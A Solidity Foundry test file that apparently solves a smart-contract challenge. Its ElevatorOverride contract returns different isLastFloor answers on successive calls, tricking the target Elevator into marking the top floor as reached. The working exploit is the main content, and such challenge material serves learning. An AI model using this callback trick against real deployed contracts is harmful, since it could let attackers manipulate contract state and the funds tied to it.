// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Elevator} from "../src/Elevator.sol";

contract ElevatorOverride {
    Elevator private immutable target;
    uint256 public count;

    constructor(address _target) {
        target = Elevator(_target);
        count = 0;
    }

    function overrider() external {
        target.goTo(1);
        require(target.top());
    }

    function isLastFloor(uint256) external returns(bool) {
        return target.floor() != 0;
    }
}

contract ElevatorTest is Test {
    Elevator elevator;
    ElevatorOverride elevatorOverride;

    function setUp() public {
        elevator = new Elevator();
        elevatorOverride = new ElevatorOverride(address(elevator));
    }

    function testelevatortReachedTopFloor() public {
        // top will never change after the first one
        elevatorOverride.overrider();
        assertEq(elevator.top(), true);
        assertEq(elevator.floor(), 1);
    }
}